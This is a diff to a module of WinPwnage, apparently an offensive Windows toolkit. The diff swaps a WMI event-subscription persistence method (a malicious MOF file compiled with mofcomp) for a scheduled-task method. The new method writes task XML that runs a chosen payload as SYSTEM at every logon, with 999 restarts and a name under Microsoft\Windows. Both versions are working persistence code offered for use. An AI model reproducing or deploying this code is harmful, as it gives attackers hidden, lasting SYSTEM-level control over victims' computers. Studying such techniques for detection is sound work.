@@ -1,12 +1,13 @@
-import os
-import time
-import tempfile
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
+import datetime
+import tempfile
+import time
+import os
 
 persistMethod2_info = {
-	"Description": "Persistence using mofcomp.exe (SYSTEM privileges)",
-	"Method": "Malicious mof file using EventFilter EventConsumer and binding",
+	"Description": "Persistence using schtasks.exe (SYSTEM privileges)",
+	"Method": "Malicious scheduled task",
 	"Id": "2",
 	"Type": "Persistence",
 	"Fixed In": "99999" if information().admin() == True else "0",
@@ -17,88 +18,91 @@ persistMethod2_info = {
 }
 
 def persistMethod2(payload, name="", add=True):
+	if not information().admin():
+		print_error("Cannot proceed, we are not elevated")
+		return False
+
 	if add:
 		if payloads().exe(payload):
-			mof_template = '''#PRAGMA AUTORECOVER
-#PRAGMA NAMESPACE ("\\\\\\\\.\\\\root\\\\subscription")
+			xml_template = """<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+	<RegistrationInfo>
+		<Date>{date}</Date>
+		<URI>\\Microsoft\\Windows\\{name}</URI>
+	</RegistrationInfo>
+	<Triggers>
+		<LogonTrigger>
+			<Enabled>true</Enabled>
+		</LogonTrigger>
+	</Triggers>
+	<Principals>
+		<Principal id="Author">
+			<UserId>S-1-5-18</UserId>
+			<RunLevel>HighestAvailable</RunLevel>
+		</Principal>
+	</Principals>
+	<Settings>
+		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+		<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+		<AllowHardTerminate>false</AllowHardTerminate>
+		<StartWhenAvailable>true</StartWhenAvailable>
+		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+		<IdleSettings>
+			<StopOnIdleEnd>true</StopOnIdleEnd>
+			<RestartOnIdle>false</RestartOnIdle>
+		</IdleSettings>
+		<AllowStartOnDemand>true</AllowStartOnDemand>
+		<Enabled>true</Enabled>
+		<Hidden>false</Hidden>
+		<RunOnlyIfIdle>false</RunOnlyIfIdle>
+		<WakeToRun>false</WakeToRun>
+		<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+		<Priority>7</Priority>
+		<RestartOnFailure>
+			<Interval>PT2H</Interval>
+			<Count>999</Count>
+		</RestartOnFailure>
+	</Settings>
+	<Actions Context="Author">
+		<Exec>
+			<Command>"{payload}"</Command>
+		</Exec>
+	</Actions>
+</Task>""".format(date=str(datetime.datetime.now()).replace(' ', 'T'), name=name, payload=payloads().exe(payload)[1])
 
-instance of __EventFilter as $Filt
-{
-	Name = "''' + name + '''";
-	Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360";
-	QueryLanguage = "WQL";    
-	EventNamespace = "root\\\\cimv2";
-};
+			try:
+				xml_file = open(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)), "w")
+				xml_file.write(xml_template)
+				xml_file.close()
+			except Exception:
+				return False
 
-instance of CommandLineEventConsumer as $Cons
-{
-	Name = "''' + name + '''";
-	RunInteractively=false;
-	CommandLineTemplate="''' + payloads().exe(payload)[1].replace(os.sep, os.sep*2) + '''";
-};
+			time.sleep(5)
 
-instance of __FilterToConsumerBinding
-{
-	Filter = $Filt;
-	Consumer = $Cons;
-};'''
-
-			if information().admin():
-				try:
-					mof_file = open(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name)), "w")
-					mof_file.write(mof_template)
-					mof_file.close()
-				except Exception:
-					print_error("Cannot proceed, unable to write mof file to disk ({})".format(
-						os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))))
-					return False
+			if os.path.isfile(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name))):
+				if process().create("schtasks.exe", params="/create /xml {path} /tn {name}".format(
+						path=os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)), name=name)):
+					print_success("Successfully created scheduled task, payload will run at login")
 				else:
-					print_success("Successfully wrote mof template to disk ({})".format(
-						os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))))
+					print_error("Unable to create scheduled task")
+					return False
 
 				time.sleep(5)
 
-				if os.path.isfile(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))):
-					print_info("Disabling file system redirection")
-					with disable_fsr():
-						print_success("Successfully disabled file system redirection")
-						exit_code = process().create("mofcomp.exe", params="{}".format(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))), get_exit_code=True)
-						print_info("Exit code: {}".format(str(exit_code)))
-						if exit_code == 0:
-							print_success("Successfully compiled mof file containing our payload ({})".format(payloads().exe(payload)[1]))
-							print_success("Successfully installed persistence, payload will after boot")
-						else:
-							print_error("Unable to compile mof file containing our payload ({})".format(payloads().exe(payload)[1]))
-
-					time.sleep(5)
-
-					try:
-						os.remove(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name)))
-					except Exception:
-						print_error("Unable to cleanup")
-						return False
-					else:
-						print_success("Successfully cleaned up, enjoy!")
-				else:
-					print_error("Unable to locate mof template on disk ({})".format(os.path.join(tempfile.gettempdir(), "{name}.mof".format(name=name))))
+				try:
+					os.remove(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)))
+				except Exception:
 					return False
 			else:
-				print_error("Cannot proceed, we are not elevated")
+				print_error("Unable to create scheduled task, xml file not found")
 				return False
 		else:
 			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		cmds = [
-			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="{name}" DELETE'),
-			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="{name}" DELETE'),
-			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="{name}"\' DELETE'),
-		]
-		for i, cmd in cmds:
-			exit_code = process().create("wmic.exe", params=cmd.format(name=name, path=payloads().exe(payload)[1]), get_exit_code=True)
-			if exit_code == 0:
-				print_success("Successfully removed {event} (exit code: {code})".format(event=i, code=exit_code))
-			else:
-				print_error("Unable to removed {event} (exit code: {code})".format(event=i, code=exit_code))
-
-			time.sleep(3)
+		if process().create("schtasks.exe", params="/delete /tn {name} /f".format(name=name)):
+			print_success("Successfully removed persistence")
+		else:
+			print_error("Unable to remove persistence")
+			return False
